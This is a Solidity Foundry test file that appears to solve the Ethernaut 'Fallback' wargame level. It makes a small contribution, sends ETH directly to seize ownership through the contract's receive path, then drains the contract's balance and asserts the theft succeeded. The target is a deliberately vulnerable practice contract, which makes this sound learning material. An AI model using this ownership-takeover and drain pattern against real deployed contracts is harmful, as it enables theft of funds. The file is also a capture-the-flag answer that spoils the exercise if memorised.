// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback public fab;

    address payable alice = payable(address(0x929615d4963D9aC8A383fCb0E118d36323213940));

    function setUp() public {
        fab = new Fallback();
        deal(address(fab), 10 ether);
        deal(alice, 2);
    }

    function testAttack() public {
        vm.startPrank(alice);
        fab.contribute{value: 1}();

        (bool ok,) = address(fab).call{value: 1}("");
        require(ok, "send ETH failed");

        fab.withdraw();
        vm.stopPrank();

        address owner = fab.owner();
        assertEq(owner, alice);
        assertEq(address(fab).balance, 0);
        assertEq(alice.balance, 2 + 10 ether);
    }

    // receive() external payable {}
    // fallback() external payable {}
}
